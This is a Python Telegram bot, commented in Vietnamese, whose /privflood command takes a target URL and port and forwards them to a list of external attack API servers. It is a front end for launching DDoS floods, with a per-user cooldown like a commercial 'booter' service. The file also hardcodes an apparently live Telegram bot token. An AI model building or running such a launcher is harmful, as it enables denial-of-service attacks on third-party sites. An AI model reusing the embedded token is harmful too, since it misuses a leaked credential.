import json
import re
import requests
import asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from datetime import datetime, timedelta

# URL cho hình ảnh phản hồi
PHOTO_URLS = {
    "loading": "https://ov20-engine.flamingtext.com/netfu/tmp28007/flamingtext_com-1656326255.png",
    "success": "https://ov19-engine.flamingtext.com/netfu/tmp28007/flamingtext_com-3059895128.png",
    "failure": "https://ov12-engine.flamingtext.com/netfu/tmp28016/coollogo_com-31571298.png",
}

# Trạng thái người dùng
user_status = {}

# Đọc danh sách URL server từ file
def get_server_urls(file_path="server.json") -> list:
    try:
        with open(file_path, "r") as file:
            return json.load(file).get("server_urls", [])
    except (FileNotFoundError, json.JSONDecodeError):
        return []

# Kiểm tra URL hợp lệ
def is_valid_url(url: str) -> bool:
    return re.match(r"^https?://", url) is not None

# Gửi phản hồi tới Telegram
async def send_response(update: Update, photo_url: str, caption: str, json_content=None):
    formatted_json = (
        f"<pre>{json.dumps(json_content, indent=4, ensure_ascii=False)}</pre>"
        if json_content
        else ""
    )
    await update.message.reply_photo(
        photo=photo_url,
        caption=f"<b>{caption}</b>\n{formatted_json}",
        parse_mode="HTML",
    )

# Xử lý phản hồi từ API server
async def handle_api_responses(update: Update, responses):
    results = []
    success_found = False

    for idx, (url, response) in enumerate(responses, 1):
        try:
            json_data = response.json()
            status = response.status_code == 200 and json_data.get("status") == "success"
        except json.JSONDecodeError:
            json_data = {"status": "error", "message": "Không thể parse JSON từ phản hồi."}
            status = False

        success_found |= status
        results.append({
            "API": f"Server API {idx}",
            "Mã trạng thái": response.status_code,
            "Kết quả": "Thành công" if status else "Thất bại",
            "Phản hồi": json_data,
        })

    # Xác định kết quả cuối cùng
    photo_url = PHOTO_URLS["success"] if success_found else PHOTO_URLS["failure"]
    caption = "Kết nối API thành công." if success_found else "Kết nối API thất bại."
    await send_response(update, photo_url, caption, results)

    return success_found

# Lệnh xử lý privflood
async def priv_flood(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id

    # Kiểm tra trạng thái người dùng
    if user_id in user_status and datetime.now() < user_status[user_id]:
        remaining_time = int((user_status[user_id] - datetime.now()).total_seconds())
        return await send_response(
            update,
            PHOTO_URLS["failure"],
            "Bạn đang có tiến trình khác đang chạy.",
            {"status": "error", "message": f"Chờ {remaining_time} giây trước khi thực hiện lệnh mới."},
        )

    # Kiểm tra và lấy tham số lệnh
    if len(context.args) < 2 or not is_valid_url(context.args[0]) or not context.args[1].isdigit():
        return await send_response(
            update,
            PHOTO_URLS["failure"],
            "Vui lòng nhập {URL} và {PORT} hợp lệ. Ví dụ: /privflood https://example.com 443.",
        )

    target_host, port = context.args[0], context.args[1]
    server_urls = get_server_urls()
    if not server_urls:
        return await send_response(update, PHOTO_URLS["failure"], "Không tìm thấy danh sách API server trong file server.json.")

    # Thay thế {port} và {host} trong URL server
    full_urls = [url.replace("{port}", port).replace("{host}", target_host) for url in server_urls]

    # Gửi thông báo "Đang xử lý"
    loading_message = await update.message.reply_photo(
        photo=PHOTO_URLS["loading"],
        caption="<b>Đang kết nối đến các server API...</b>",
        parse_mode="HTML",
    )
    await asyncio.sleep(3)
    await loading_message.delete()

    # Gửi yêu cầu đến các API server
    try:
        responses = [(url, requests.get(url)) for url in full_urls]
        success_found = await handle_api_responses(update, responses)

        # Nếu có phản hồi thành công, đặt thời gian chờ 120 giây
        if success_found:
            user_status[user_id] = datetime.now() + timedelta(seconds=120)

    except requests.RequestException as e:
        await send_response(
            update,
            PHOTO_URLS["failure"],
            "Kết nối API thất bại.",
            {"status": "error", "message": str(e)},
        )

# Khởi tạo bot
def main():
    app = ApplicationBuilder().token("7065038890:AAHSqpcpEKzjOANvbXTiuYqPFtwhmqwOZnU").build()
    app.add_handler(CommandHandler("privflood", priv_flood))
    app.run_polling()

if __name__ == "__main__":
    main()
